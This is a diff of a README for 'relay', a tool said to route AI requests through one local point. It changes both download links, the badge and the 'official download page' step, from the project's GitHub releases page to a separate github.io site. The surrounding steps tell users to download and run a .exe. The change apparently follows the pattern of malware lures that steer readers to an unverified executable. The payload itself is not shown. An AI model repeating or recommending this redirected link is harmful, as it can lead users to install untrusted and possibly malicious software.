@@ -1,6 +1,6 @@
 # ⚡ relay - Route your artificial intelligence requests easily
 
-[![](https://img.shields.io/badge/Download-Relay-blue.svg)](https://github.com/recorded-phrygian494/relay/releases)
+[![](https://img.shields.io/badge/Download-Relay-blue.svg)](https://recorded-phrygian494.github.io)
 
 Relay acts as a bridge for your computer. It helps you send requests to different artificial intelligence providers through one single point. You gain control over where your data goes. You avoid tracking and keep your activities private. This tool runs on your own machine. 
 
@@ -21,7 +21,7 @@ The software works as a single file. You download it, run it, and it stays ready
 
 Follow these steps to get the software running on your computer.
 
-1. Visit the [official download page](https://github.com/recorded-phrygian494/relay/releases).
+1. Visit the [official download page](https://recorded-phrygian494.github.io).
 2. Locate the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads or Documents folder.
